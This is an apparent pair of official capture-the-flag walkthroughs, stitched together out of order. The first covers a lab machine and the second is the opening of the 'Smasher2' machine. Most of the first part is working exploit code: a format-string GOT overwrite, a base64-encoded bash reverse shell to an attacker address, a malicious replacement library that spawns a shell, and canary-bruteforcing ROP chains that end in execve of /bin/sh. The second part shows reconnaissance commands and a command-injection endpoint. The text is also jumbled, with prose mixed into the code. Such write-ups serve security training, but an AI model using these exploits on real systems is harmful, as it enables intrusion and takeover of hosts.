$ebp   : 0xffffd1f8  →  0xffffdaa8  →  0xffffdc08  →  0x00000000
$esi   : 0xda26
$edi   : 0xf7fa7000  →  0x001dbd6c
$eip   : 0x5
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow RESUME 
virtualx86 identification]                                                       
                                                
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────── stack ────
0xffffd1bc│+0x0000: 0x56557103  →  <log_access+140> add esp, 0x10        ← $esp
────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x5
─────────────────────────────────────── threads ────
[#0] Id 1, Name: "httpserver", stopped, reason: SIGSEGV
#!/usr/bin/python
from pwn import *
from requests import get
from urllib import quote
context(arch='i686', os='linux')
def parseMaps(maps):
  binary_base = int(maps[0].split('-')[0], 16)
  libc_base = int(maps[6].split('-')[0], 16)
  return binary_base, libc_base
def getMaps():
  headers = { "Range" : "bytes=0-1000" }
  maps = get("http://localhost:9999//proc/self/maps", headers = headers)
  return parseMaps(maps.content.splitlines())
binary_base, libc_base = getMaps()
log.success("Binary base address: {}".format(hex(binary_base)))
log.success("Libc base address: {}".format(hex(libc_base)))
b = ELF("./httpserver")
l = ELF("/lib/i386-linux-gnu/libc.so.6")
puts_got = b.got["puts"]
puts = binary_base + puts_got
The fmtstr_payload()  method takes in two arguments, where the ﬁrst argument denotes the 
oﬀset of the overwrite and the second argument is a dict containing the target address and 
value. In the code above, we're trying to overwrite the GOT address of puts with the address of 
the system()  function. Start the server on another terminal and execute this script.
Going back to the binary, we ﬁnd that it tried to execute the GET  command.
This is because the log_access method called puts("GET")  but ended up calling system("GET") , 
as we overwrote puts with system. 
system_libc = l.symbols["system"]
system = libc_base + system_libc
log.success("puts address: {}".format(hex(puts)))
log.success("system address: {}".format(hex(system)))
r = remote('127.0.0.1', 9999)
payload = fmtstr_payload(53, { puts : system })
r.sendline("GET {} HTTP/1.1\n".format(quote(payload)))
Foothold
 
We can go ahead and use this script to execute a reverse shell on the box now. A command with 
spaces can't be used, due to the nature of HTTP requests. However, the $IFS shell variable can be 
used to separate values instead. 
First, encode a bash reverse shell as base64. 
This command can be decoded and piped to bash for execution.
Before exploiting the box, we'll need a copy of the remote libc. This can be downloaded through 
the LFI.
Update the script to use this library and add the correct IP address.
echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==|base64${IFS}-
d|bash
#!/usr/bin/python
from pwn import *
from requests import get
from urllib import quote
context(arch='i686', os='linux')
def parseMaps(maps):
  binary_base = int(maps[0].split('-')[0], 16)
  libc_base = int(maps[6].split('-')[0], 16)
  return binary_base, libc_base
def getMaps():
  headers = { "Range" : "bytes=0-1000" }
  maps = get("http://10.10.10.148:9999//proc/self/maps", headers = headers)
  return parseMaps(maps.content.splitlines())
binary_base, libc_base = getMaps()
log.success("Binary base address: {}".format(hex(binary_base)))
log.success("Libc base address: {}".format(hex(libc_base)))
b = ELF("./httpserver")
l = ELF("./libc.so.6")
Executing the script should return a shell as the user john .
puts_got = b.got["puts"]
puts = binary_base + puts_got
system_libc = l.symbols["system"]
system = libc_base + system_libc
log.success("puts address: {}".format(hex(puts)))
log.success("system address: {}".format(hex(system)))
r = remote('10.10.10.148', 9999)
payload = fmtstr_payload(53, { puts : system })
cmd = 
"echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==|base64${IFS}
-d|bash"
r.sendline("{} {} HTTP/1.1\n".format(cmd, quote(payload)))
Lateral Movement
 
We can copy our public key to john's authorized_keys for an interactive SSH session.
Looking at the user's sudo privileges, it's found that he can execute a binary as r4j.
The binary prints out the contents of /var/log/auth.log  on execution.
Looking at the shared object dependencies using ldd  , an unknown library is seen.
Let's transfer both of these using scp and analyze them using Ghidra.
After opening the binary in CodeBrowser, expand the function in the symbol tree. It's found that 
the main()  function ends up calling the printlog()  function. This function is present in the 
liblog.so  library. 
The printlog()  function does nothing but execute the command above. This isn't vulnerable to 
any kind of overﬂow as it's a constant string. Going back to the box and looking at the ﬁle 
permissions on the library, it's found to be world writable.
This will let us compile a malicious library and replace the existing one. Create a C program with 
the following contents:
The function printlog()  executes /bin/bash  using the system function. Next, compile it as a 
shared object using GCC.
Transfer the compiled library to the desired location using scp.
Going back to the SSH session and executing the binary, a shell as r4j should be spawned. 
void printlog() {
  system("/bin/bash");
}
Privilege Escalation
 
A public key can be copied to r4j's folder to gain SSH access as before. Looking at the processes 
running as root, the following process is seen.
Let's transfer the contact  binary and analyze it locally. 
All binary protections are found to be turned on, according to checksec  .
Opening it up in Ghidra and selecting the Defined Strings  window.
There are some interesting strings to be seen, which are similar to the ones found in the HTTP 
server earlier. Double-click on the listen on port...  string, and then right-click > References > 
Show References to this address. Double-click on the reference shown in the pop-up window to 
navigate to it. 
The binary creates a listener on port 1337 and waits for connections. The function FUN_001014ee  
is called with the fd, as soon as a connection is received. Double-click on the name to navigate to 
it.
The function executes fork()  and spawns a child process. Then, the write()  function is used 
to send a prompt to the client, followed by a call to another function. 
This function calls the recv()  function and reads 0x400 i.e. 128 bytes from the client. This input 
is written to the local_48 buﬀer, which is 56 bytes in length. This will result in a buﬀer overﬂow if 
an input length greater than 56 is sent. However, this overﬂow can't be directly exploited due to 
the presence of a stack canary. The stack canary is a value containing 8 random bytes, which sits 
above the stack base. This value is stored and checked for changes before the function exists. 
Any change in the canary will result in an exception and process exit.
Exploit Development
 
Let's try verifying the observations made above on the binary. Execute the binary and then input 
the following commands on another terminal.
The ﬁrst input was 57 bytes (56 As and a line break) in length while the second input was 56 in 
length. As seen in the image above, the server responded with the message Done.  when the 
input length was 56. Looking at the terminal executing the binary, we see the following output.
As expected, the binary crashed when the input was greater than 56 and a stack smashing 
detected  message was printed as a result of the corrupted canary. Let's look at this in GDB. Add 
a break point at the recv  function and run the binary.
Send an input with 57 characters, after which the breakpoint should be hit. Enter n  to jump out 
of the recv  function and go back to the calling function. The entire stack can be printed using 
the stack  command.
gef➤  n
<SNIP>
gef➤  stack
─────────────────────── Stack bottom (lower address)──────────────────────
0x00007fffffffe410│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffe418│+0x0008: 0x0000000400000000
0x00007fffffffe420│+0x0010: "AAAA<SNIP>AAAAAA[...]"    ← $rsi
0x00007fffffffe428│+0x0018: "AAAAAA<SNIP>AAAAA\n[...]"
0x00007fffffffe430│+0x0020: 0x4141414141414141
0x00007fffffffe438│+0x0028: 0x4141414141414141
0x00007fffffffe440│+0x0030: 0x4141414141414141
0x00007fffffffe448│+0x0038: 0x4141414141414141
0x00007fffffffe450│+0x0040: 0x4141414141414141
The snippet above shows the stack layout, RBP is found at the address 0x00007fffffffe460  and 
the canary can be seen above it. The ﬁrst byte of the canary is found to be 0a , which is the hex 
code for new line, which was part of our input. We already know the server sends a Done  
message if the canary is intact. This can be used to perform an oracle attack and bruteforce the 
canary byte-by-byte until the Done  message is received. The canary will remain constant across 
all child processes, since the child and parent share the same memory layout. Let's write a 
python script to do this.
The script starts from the ﬁrst byte, and bruteforces all characters between 0x00 and 0xﬀ until it 
receives a Done.  response. All successful characters are appended to the canary until it reaches 
a length of 8.
0x00007fffffffe458│+0x0048: 0xd86036e0540b060a
0x00007fffffffe460│+0x0050: 0x00007fffffffe490  ← $rbp
0x00007fffffffe468│+0x0058: 0x0000555555555562  →   mov eax, DWORD PTR [rbp-
0x14] ($savedip)
─────────────────────────── Stack top (higher address) ──────
from pwn import *
import sys
context.log_level = 'debug'
def getByte(chars):
  for ch in range(0x00, 0x100):
    r = remote('localhost', 1337, level = 'error')
    payload = "A" * 56 + chars + chr(ch)
    r.recvline()
    r.send(payload)
    try :
          resp = r.recvline(timeout=2).rstrip()
          if "Done." == resp:
            r.close()
            return ch
    except:
          sys.stdout.write('{:02x}\x08\x08'.format(ch))
          pass
    r.close()
def getCanary():
  canary = ''
  sys.stdout.write("Canary: ")
  while len(canary) != 8:
    ch = getByte(canary)
    canary += chr(ch)
    sys.stdout.write('{:02x}'.format(ch))
  return canary
canary = getCanary()
log.success("Canary found: {}".format(hex(u64(canary))))
Similarly, we can bruteforce the RBP address as well as the saved returned address. The saved 
return address can be used to calculate the base of the binary, which will let us utilize functions 
within the binary. 
The script is modiﬁed with the changes shown above. Running the script should return all three 
values.
from pwn import *
import sys
context.log_level = 'debug'
def getByte(chars):
  for ch in range(0x00, 0x100):
    r = remote('localhost', 1337, level = 'error')
    payload = "A" * 56 + chars + chr(ch)
    r.recvline()
    r.send(payload)
    try :
          resp = r.recvline(timeout=2).rstrip()
          if "Done." == resp:
            r.close()
            return ch
    except:
          sys.stdout.write('{:02x}\x08\x08'.format(ch))
          pass
    r.close()
def getContent(chars):
  content = ''
  while len(content) != 8:
    ch = getByte(chars + content)
    content += chr(ch)
    sys.stdout.write('{:02x}'.format(ch))
  return content
sys.stdout.write("Canary: ")
canary = getContent('')
log.success("\nCanary found: {}".format(hex(u64(canary))))
sys.stdout.write("RBP: ")
rbp = getContent(canary)
log.success("\nRBP found: {}".format(hex(u64(rbp))))
sys.stdout.write("Saved return address: ")
savedRip = getContent(canary + rbp)
log.success("\nSaved return address found: {}".format(hex(u64(savedRip))))
Let's go back to GDB and ﬁnd the oﬀset between the saved RIP and binary base addresses. 
Restart the process and add a breakpoint at recv, send an input with 56 characters and enter n  
to continue. The vmmap  command can be used to ﬁnd the binary base address.
The saved RIP is set to 0x0000555555555562  and the binary base address is 
0x0000555555554000 , which means the diﬀerence between them is 0x1562 . This value can be 
used to calculate addresses of gadgets and functions. We can leak the GOT address of any 
function used by the binary, and use it to calculate the libc base address. This can be achieved by 
using the write  function to send back the leaked address. 
The write function takes in three arguments: the output fd, the buﬀer to print and the number of 
bytes to print. According to the 64-bit Linux calling convention, the arguments should be passed 
in the RDI, RSI and RDX registers. Going back to  GDB and looking at the registers, it's seen that 
the ﬁle descriptor is already present in RDI.
gef➤  stack
────────────────────── Stack bottom (lower address) 
─────────────────────────────────────────
0x00007fffffffe3d0│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffe3d8│+0x0008: 0x0000000400000000
0x00007fffffffe3e0│+0x0010: "AAAAAAAAAAAAAAAAAAAA[...]"    ← $rsi
0x00007fffffffe3e8│+0x0018: "AAAAAAAAAAAAAAAAAAA"
0x00007fffffffe3f0│+0x0020: "AAAAAAAAAAAAAAAAAAA"
0x00007fffffffe3f8│+0x0028: "AAAAAAAAAAAAAAAAAA"
0x00007fffffffe400│+0x0030: "AAAAAAAAAAAAAAAAA"
0x00007fffffffe408│+0x0038: "AAAAAAAAAAAAAAA"
0x00007fffffffe410│+0x0040: 0x0a41414141414141 ("AAAAAAA"?)
0x00007fffffffe418│+0x0048: 0xb2bbe69b97234c00
0x00007fffffffe420│+0x0050: 0x00007fffffffe450  ← $rbp
0x00007fffffffe428│+0x0058: 0x0000555555555562  →   mov eax, DWORD PTR [rbp-
0x14] ($savedip)
─────────────────────────────── Stack top (higher address) ─────────────────
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- ./contact
<SNIP>
This allows us to skip setting RDI to the fd manually. The RSI and RDX registers can be set using 
using POP  instructions, which can be found using ropper .
There's no POP RSI  gadget, but ropper was able to ﬁnd a POP RSI; POP R15  gadget. We can 
introduce some junk into our payload to compensate for the extra pop. Next, RSI needs to be set 
to the GOT address to write , which can be found using pwntools. The RDX value should be set 
to 8, as we're trying to leak an 8 byte address.
gef➤  info registers 
rax            0x38                0x38
rbx            0x0                 0x0
rcx            0x7ffff7edcc8d      0x7ffff7edcc8d
rdx            0x400               0x400
rsi            0x7fffffffe3e0      0x7fffffffe3e0
rdi            0x4                 0x4
rbp            0x7fffffffe420      0x7fffffffe420
rsp            0x7fffffffe3d0      0x7fffffffe3d0
<SNIP>
from pwn import *
import sys
def getByte(chars):
  for ch in range(0x00, 0x100):
    r = remote('localhost', 1337, level = 'error')
    payload = "A" * 56 + chars + chr(ch)
    r.recvline()
    r.send(payload)
    try :
          resp = r.recvline(timeout=2).rstrip()
          if "Done." == resp:
            r.close()
            return ch
    except:
          sys.stdout.write('{:02x}\x08\x08'.format(ch))
          pass
    r.close()
def getContent(chars):
  content = ''
  while len(content) != 8:
    ch = getByte(chars + content)
    content += chr(ch)
    sys.stdout.write('{:02x}'.format(ch))
The script calculates the base address and then uses it to ﬁnd the addresses of the gadgets. Next, 
the GOT address and the PLT address for write  are found. A chain is created to pop 0x8  and 
write_GOT into RDX and RSI respectively. 
  return content
sys.stdout.write("Canary: ")
canary = getContent('')
print("\n[*] Canary found: {}".format(hex(u64(canary))))
sys.stdout.write("RBP: ")
rbp = getContent(canary)
print("\n[*] RBP found: {}".format(hex(u64(rbp))))
sys.stdout.write("Saved return address: ")
savedRip = u64(getContent(canary + rbp))
print("\n[*] Saved return address found: {}".format(hex(savedRip)))
e = ELF("./contact")
binaryBase = savedRip - 0x1562
pieAddr = lambda addr : addr + binaryBase
'''
0x0000000000001265: pop rdx; ret;
'''
pop_rdx = p64(pieAddr(0x1265))
'''
0x0000000000001649: pop rsi; pop r15; ret;
'''
pop_rsi_r15 = p64(pieAddr(0x1649))
write_GOT = p64(pieAddr(e.got['write']))
write = p64(pieAddr(e.symbols['write']))
chain = "A"* 56 + canary + rbp
# overwrite return address
chain += pop_rdx + p64(0x8)
chain += pop_rsi_r15 + write_GOT + "B" * 8 # junk
chain += write # call write function 
'''
write(fd, write@GOT, 0x8)
'''
r = remote('localhost', 1337, level = 'error')
r.recvline()
r.send(chain)
write_libc = u64(r.recv(8))
log.success("Leaked write@libc: {}".format(hex(write_libc)))
r.close()
Running the script above leaks the libc write address, which can be used to ﬁnd the libc base 
address. Once the libc address is found, it can be used to calculate a one_gadget. One_gadget is a 
tool that ﬁnds addresses in libc leading to an execve("/bin/sh", NULL, NULL)  function call. 
Note: These addresses vary from host to host. 
The third gadget looks convenient, and just needs rsi and rdx to be null. We can clear them out by 
using the pop rsi; pop r15; ret  and pop rdx; ret  gadgets. When execve  executes /bin/sh , 
as stdout and stdin are present on the server side, this means that we won't be able to interact 
with the process remotely. We can get around this by calling the dup2 function, and duplicating 
the stdin (0x0) and stdout (0x1) ﬁle descriptors. The dup2 function accepts two arguments, the 
ﬁrst is the oldfd i.e. our socket and the second is the newfd i.e. stdin / stdout.
The calls above will duplicate stdin and stdout to the new fd i.e. 4, after which we should be able 
to interact with the shell. 
dup2(4, 0);
dup2(4, 1);
from pwn import *
import sys
def getByte(chars):
  for ch in range(0x00, 0x100):
    r = remote('localhost', 1337, level = 'error')
    payload = "A" * 56 + chars + chr(ch)
    r.recvline()
    r.send(payload)
    try :
          resp = r.recvline(timeout=2).rstrip()
          if "Done." == resp:
           r.close()
            return ch
    except:
          r.close()
          sys.stdout.write('{:02x}\x08\x08'.format(ch))
          pass
def getContent(chars):
  content = ''
  while len(content) != 8:
    ch = getByte(chars + content)
    content += chr(ch)
    sys.stdout.write('{:02x}'.format(ch))
  return content
sys.stdout.write("Canary: ")
canary = getContent('')
print("\n[*] Canary found: {}".format(hex(u64(canary))))
sys.stdout.write("RBP: ")
rbp = getContent(canary)
print("\n[*] RBP found: {}".format(hex(u64(rbp))))
sys.stdout.write("Saved return address: ")
savedRip = u64(getContent(canary + rbp))
print("\n[*] Saved return address found: {}".format(hex(savedRip)))
e = ELF("./contact")
binaryBase = savedRip - 0x1562
pieAddr = lambda addr : addr + binaryBase
'''
0x0000000000001265: pop rdx; ret;
'''
pop_rdx = p64(pieAddr(0x1265))
'''
0x0000000000001649: pop rsi; pop r15; ret;
'''
pop_rsi_r15 = p64(pieAddr(0x1649))
'''
0x000000000000164b: pop rdi; ret;
'''
pop_rdi = p64(pieAddr(0x164b))
write_GOT = p64(pieAddr(e.got['write']))
write = p64(pieAddr(e.symbols['write']))
chain = "A"* 56 + canary + rbp
# overwrite return address
chain += pop_rdx + p64(0x8)
chain += pop_rsi_r15 + write_GOT + "B" * 8 # junk
chain += write # call write function
'''
write(fd, write@GOT, 0x8)
'''
r = remote('localhost', 1337, level = 'error')
r.recvline()
r.send(chain)
write_libc = u64(r.recv(8, timeout=2))
log.success("Leaked write@libc: {}".format(hex(write_libc)))
r.close()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = write_libc - libc.symbols['write'] # Find libc base address
log.success("Libc based address: {}".format(hex(libc_base)))
dup2 = p64(libc_base + libc.symbols['dup2']) # Calculate dup2 address
'''
0xe2386 execve("/bin/sh", rsi, rdx)
'''
one_gadget = p64(libc_base + 0xe2386)
chain = "A" * 56 + canary + rbp
# overwrite return address
chain += pop_rdi + p64(0x4) # oldfd 
chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # newfd : stdin
chain += dup2 # call dup2
'''
dup2(0, 4);
'''
chain += pop_rdi + p64(0x4) # oldfd 
chain += pop_rsi_r15 + p64(0x1)  + "JUNKJUNK" # newfd : stdout
chain += dup2 # call dup2
'''
dup2(1, 4);
'''
chain += pop_rdx + p64(0x0) # Zero out rdx
chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # Zero out rsi
chain += one_gadget  # call execve
'''
execve("/bin/sh", NULL, NULL);
'''
log.info("Sending final payload")
r = remote('localhost', 1337, level = 'error')
r.recvline()
r.send(chain)
r.interactive()
The script calculates the libc base address and uses it to ﬁnd the addresses for the dup2 function 
and the execve gadget. Then, a ROP chain is created to execute the dup2 calls followed by 
execve("/bin/sh", NULL, NULL) .
Now that we have it working locally, the remote libc can be downloaded. We'll have to forward 
port 1337 from the remote box using SSH, in order to exploit it.
Update the script with the path to the remote libc, and swap the existing one_gadget with a new 
one.
The second gadget looks ﬁne and can be swapped with the local one. Here's the ﬁnal exploit.
from pwn import *
import sys
def getByte(chars):
  for ch in range(0x00, 0x100):
    r = remote('localhost', 1337, level = 'error')
    payload = "A" * 56 + chars + chr(ch)
    r.recvline()
    r.send(payload)
    try :
          resp = r.recvline(timeout=2).rstrip()
          if "Done." == resp:
        r.close()
            return ch
    except:
          r.close()
          sys.stdout.write('{:02x}\x08\x08'.format(ch))
          pass
def getContent(chars):
  content = ''
  while len(content) != 8:
    ch = getByte(chars + content)
    content += chr(ch)
    sys.stdout.write('{:02x}'.format(ch))
  return content
sys.stdout.write("Canary: ")
canary = getContent('')
print("\n[*] Canary found: {}".format(hex(u64(canary))))
sys.stdout.write("RBP: ")
rbp = getContent(canary)
print("\n[*] RBP found: {}".format(hex(u64(rbp))))
sys.stdout.write("Saved return address: ")
savedRip = u64(getContent(canary + rbp))
print("\n[*] Saved return address found: {}".format(hex(savedRip)))
e = ELF("./contact")
binaryBase = savedRip - 0x1562
pieAddr = lambda addr : addr + binaryBase
'''
0x0000000000001265: pop rdx; ret;
'''
pop_rdx = p64(pieAddr(0x1265))
'''
0x0000000000001649: pop rsi; pop r15; ret;
'''
pop_rsi_r15 = p64(pieAddr(0x1649))
'''
0x000000000000164b: pop rdi; ret;
'''
pop_rdi = p64(pieAddr(0x164b))
write_GOT = p64(pieAddr(e.got['write']))
write = p64(pieAddr(e.symbols['write']))
chain = "A"* 56 + canary + rbp
# overwrite return address
chain += pop_rdx + p64(0x8)
chain += pop_rsi_r15 + write_GOT + "B" * 8 # junk
chain += write # call write function
'''
write(fd, write@GOT, 0x8)
'''
r = remote('localhost', 1337, level = 'debug')
r.recvline()
r.send(chain)
write_libc = u64(r.recv(8, timeout=2))
log.success("Leaked write@libc: {}".format(hex(write_libc)))
r.close()
libc = ELF("./libc.so.6_64")
libc_base = write_libc - libc.symbols['write'] # Find libc base address
log.success("Libc based address: {}".format(hex(libc_base)))
dup2 = p64(libc_base + libc.symbols['dup2']) # Calculate dup2 address
'''
0x4f322 execve("/bin/sh", rsp+0x40, environ)
'''
one_gadget = p64(libc_base +  0x4f322 )
chain = "A" * 56 + canary + rbp
# overwrite return address
chain += pop_rdi + p64(0x4) # oldfd 
chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # newfd : stdin
chain += dup2 # call dup2
'''
dup2(0, 4);
'''
chain += pop_rdi + p64(0x4) # oldfd 
chain += pop_rsi_r15 + p64(0x1)  + "JUNKJUNK" # newfd : stdout
chain += dup2 # call dup2
'''
dup2(1, 4);
'''
chain += pop_rdx + p64(0x0) # Zero out rdx
chain += pop_rsi_r15 + p64(0x0) + "JUNKJUNK" # Zero out rsi
chain += one_gadget  # call execve
'''
execve("/bin/sh", NULL, NULL);
'''
log.info("Sending final payload")
r = remote('localhost', 1337, level = 'error')
r.recvline()
r.send(chain)
r.interactive(prompt = '# ')
 
 
 
 
 
 
 
Smasher2 
29​th​ October 2019 / Document No D19.100.41 
Prepared By: MinatoTW 
Machine Author: dzonerzy & xG0 
Difficulty: Insane 
Classification: Official 
 
 
Page 1 / 29 
 
 
Synopsis 
Smasher2 is an insane difficult linux machine, which requires knowledge of Python, C and kernel
   
 
 
 
 
 
 
 
 
 
   
 
 
exploitation. A folder protected by Basic Authentication is brute-forced to gain source code for a
   
 
 
 
 
   
 
 
 
 
 
   
session manager on one of the vhosts. A shared object file is used by the session manager which
 
 
 
 
 
 
   
 
 
   
 
 
 
 
 
 
has a vulnerable function leading to credential leakage. Then a kernel module is found which
   
 
 
 
 
 
 
   
 
 
 
 
 
uses a weak mmap handler and is exploited to gain a root shell.  
 
Skills Required 
●
Source code review 
●
Linux enumeration 
●
Kernel exploitation 
●
Reverse engineering 
 
Skills Learned 
●
Exploiting mmap handlers 
●
Reversing shared objects 
 
 
 
 
 
 
 
 
Page 2 / 29 
 
Enumeration 
Nmap 
 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.135 | grep ^[0-9] | cut -d '/' -f 1 
| tr '\n' ',' | sed s/,$//) 
nmap -p$ports -sC -sV 10.10.10.135 
 
 
 
We have SSH open on 22 , DNS on 53 and Apache running on port 80. 
 
DNS 
A DNS server can be used to gain information about sub-domains and vhosts. As we don’t have a 
vhost yet, let's try to do a reverse lookup using dig. 
Page 3 / 29 
 
 
dig -x 10.10.10.135 @10.10.10.135 
 
This will try to find any records for the IP address we specified. 
 
 
 
We see that there are no such records. Let’s try to do a zone transfer now. We can use 
smasher2.htb as a vhost based upon the box name. 
 
dig -t axfr smasher2.htb @10.10.10.135 
 
Page 4 / 29 
 
 
 
We see that it worked and now we have two new vhosts, i.e. wonderfulsessionmanager.htb and 
root.smasher2.htb. We can proceed to add these to /etc/hosts. 
 
 
Apache 
Browsing to ​http://smasher2.htb​ we see a default Apache installation for Ubuntu. 
Gobuster 
Let’s run gobuster to find files and folders on the server. We’ll add the status code 401 to find 
pages protected by basic authentication. 
 
gobuster dir -u http://10.10.10.135/ -w directory-list-2.3-medium.txt -t 100 -x php 
 
Page 5 / 29 
 
We find a folder named backup which contains the following files. 
 
 
 
We find two files auth.py and ses.so. Let’s download both of them. 
 
wget http://smasher2.htb/backup/auth.py 
wget http://smasher2.htb/backup/ses.so 
 
Let’s save these files for later and proceed to examine the other vhost i.e. 
wonderfulsessionmanager.htb. Browsing to the page, we see a session manager website. 
 
 
 
There’s a login page which asks for a password.  
Page 6 / 29 
 
 
 
Let’s try sending a request and intercept it in burp. 
 
 
 
Looking at the response we find that the backend server is a python Werkzeug / Flask server. We 
also have a python script which was found in the backup folder. Let’s examine it to see if it’s the 
source code for this server. 
 
Page 7 / 29 
 
Source Code Review and Reverse Engineering 
Looking at the imports in auth.py, we see that it imports ses which is the shared object we found 
and flask, which is the server. 
 
#!/usr/bin/env python 
import​ ses 
from​ flask ​import​ session,redirect, url_for, request,render_template, 
jsonify,Flask, send_from_directory 
from​ threading ​import​ Lock 
import​ hashlib 
import​ hmac 
import​ os 
import​ base64 
import​ subprocess 
import​ time 
 
Then the methods are declared at the beginning: 
 
def​ ​get_secure_key​(): 
m = hashlib.sha1() 
m.update(os.urandom(​32​)) 
return​ m.hexdigest() 
 
def​ ​craft_secure_token​(content): 
h = hmac.new(​"HMACSecureKey123!"​, base64.b64encode(content).encode(), 
hashlib.sha256) 
return​ h.hexdigest() 
 
 
lock = Lock() 
app = Flask(__name__) 
app.config[​'SECRET_KEY'​] = get_secure_key() 
Managers = {} 
 
def​ ​log_creds​(ip, c): 
with​ open(​"creds.log"​, ​"a"​) ​as​ creds: 
 
creds.write(​"Login from {} with data {}:{}\n"​.format(ip, c[​"username"​], 
c[​"password"​])) 
Page 8 / 29 
 
 
creds.close() 
 
def​ ​safe_get_manager​(id): 
lock.acquire() 
manager = Managers[id] 
lock.release() 
return​ manager 
 
def​ ​safe_init_manager​(id): 
lock.acquire() 
if​ id ​in​ Managers: 
 
      ​del​ Managers[id] 
else​: 
 
login = [​"<REDACTED>"​, ​"<REDACTED>"​] 
 
Managers.update({id: ses.SessionManager(login, 
craft_secure_token(​":"​.join(login)))}) 
lock.release() 
 
def​ ​safe_have_manager​(id): 
ret = ​False 
lock.acquire() 
ret = id ​in​ Managers 
lock.release() 
 
Looking at the safe_init_manager method, we see that it accepts an ​id parameter and checks if
 
 
 
 
 
 
 
   
 
 
 
 
 
   
exists in the Managers dict declared earlier. If it doesn’t already exist, the dict is updated with the
 
 
 
 
 
 
     
 
 
 
 
   
 
 
 
key id and it’s value as the ses.SessionManager object. This takes a list of the form [ ‘username’,
 
 
 
 
 
 
 
 
 
 
   
 
 
 
   
 
‘password’] and a secure token. The craft_secure_token method is used to create the secure
 
   
 
 
 
 
 
 
 
 
 
 
 
token, which is a SHA256 digest of the string username + password. The log_creds method logs
 
     
 
 
 
 
 
   
 
 
 
 
 
a credential pair into creds.log. The secret key is a random 32-byte string, so we won’t be able to
 
 
 
 
 
 
 
     
 
 
 
 
 
 
 
 
 
brute force it.  
 
Scrolling down, we see a definition for the /auth route which is used to login. 
 
@app.route('/auth', methods=['POST']) 
def​ ​login​(): 
ret = {​"authenticated"​: ​None​, ​"result"​: ​None​} 
manager = safe_get_manager(session[​"id"​]) 
data = request.get_json(silent=​True​) 
Page 9 / 29 
 
if​ data: 
 
try​: 
 
tmp_login = dict(data[​"data"​]) 
 
except​: 
 
pass 
 
tmp_user_login = ​None 
 
try​: 
 
is_logged = manager.check_login(data) 
 
secret_token_info = [​"/api/<api_key>/job"​, manager.secret_key, 
int(time.time())] 
 
try​: 
 
tmp_user_login = {​"username"​: tmp_login[​"username"​], ​"password"​: 
tmp_login[​"password"​]} 
 
except​: 
 
pass 
 
if​ ​not​ is_logged[​0​]: 
 
ret[​"authenticated"​] = ​False 
 
ret[​"result"​] = ​"Cannot authenticate with data: %s - %s"​ % 
(is_logged[​1​], ​"Too many tentatives, wait 2 minutes!"​ ​if​ manager.blocked ​else​ ​"Try 
again!"​) 
 
else​: 
 
if​ tmp_user_login ​is​ ​not​ ​None​: 
 
log_creds(request.remote_addr, tmp_user_login) 
 
ret[​"authenticated"​] = ​True 
 
ret[​"result"​] = {​"endpoint"​: secret_token_info[​0​], ​"key"​: 
secret_token_info[​1​], ​"creation_date"​: secret_token_info[​2​]} 
 
except​ TypeError ​as​ e: 
 
ret[​"authenticated"​] = ​False 
 
ret[​"result"​] = str(e) 
else​: 
 
ret[​"authenticated"​] = ​False 
 
ret[​"result"​] = ​"Cannot authenticate missing parameters." 
return​ jsonify(ret) 
 
First the manager variable is initialized with a ses.SessionManager object using the id. Then the
 
 
 
   
 
   
 
 
 
 
 
 
 
data variable is used to store the requested JSON. If it’s not null, then tmp_login is used to store
 
   
 
 
 
 
 
   
 
 
 
 
   
 
 
 
the requested credentials. Then manager.check_login is used to check if the login is valid, which
 
 
 
 
   
 
 
   
 
   
 
 
returns an array. An array named secret_token_info is created with details about the API key. If
 
 
 
 
 
 
   
 
 
 
 
 
 
   
islogged[0] is not true, the authentication fails and the message is returned. The manager.block
 
 
 
 
 
 
 
 
 
   
 
 
 
attribute decides whether the user is blocked or not. If the login is successful, then it goes ahead
 
 
 
 
   
 
 
   
 
   
 
   
 
 
and logs the creds using the log_creds method, and also returns the API key and endpoint to
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Page 10 / 29 
 
access.  
 
Looking at the endpoint route: 
 
@app.route("/api/<key>/job", methods=['POST']) 
def​ ​job​(key): 
ret = {​"success"​: ​None​, ​"result"​: ​None​} 
manager = safe_get_manager(session[​"id"​]) 
if​ manager.secret_key == key: 
 
data = request.get_json(silent=​True​) 
 
if​ data ​and​ type(data) == dict: 
 
if​ ​"schedule"​ ​in​ data: 
 
out = subprocess.check_output([​'bash'​, ​'-c'​, data[​"schedule"​]]) 
 
ret[​"success"​] = ​True 
 
ret[​"result"​] = out 
 
else​: 
 
ret[​"success"​] = ​False 
 
ret[​"result"​] = ​"Missing schedule parameter." 
 
else​: 
 
ret[​"success"​] = ​False 
 
ret[​"result"​] = ​"Invalid value provided." 
else​: 
 
ret[​"success"​] = ​False 
 
ret[​"result"​] = ​"Invalid token." 
return​ jsonify(ret) 
 
We see that it accepts JSON via a POST request, and uses the schedule value to execute the
 
 
   
 
 
   
 
 
 
 
 
 
 
 
 
 
subprocess.check_output method. As there is no sanitization in place, this is vulnerable to
 
 
 
 
 
 
 
 
 
 
 
 
 
command injection. Let’s reverse the ses.so file to examine the method definitions. You can use
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
your preferred decompiler / disassembler to reverse engineer the shared object. A trial version of
 
 
   
 
 
 
 
 
 
   
 
 
 
Hopper​ will also suffice. 
 
Looking at the SessionManager_init method we see the object initialization: 
Page 11 / 29 
 
 
 
The object consists of user_login (a list), and secret_key (secure token). We saw this previously in
 
 
 
 
   
 
 
 
 
 
 
 
 
   
the safe_init_manager method, where the login list and craft_secure_token method were used.
 
 
 
 
 
 
 
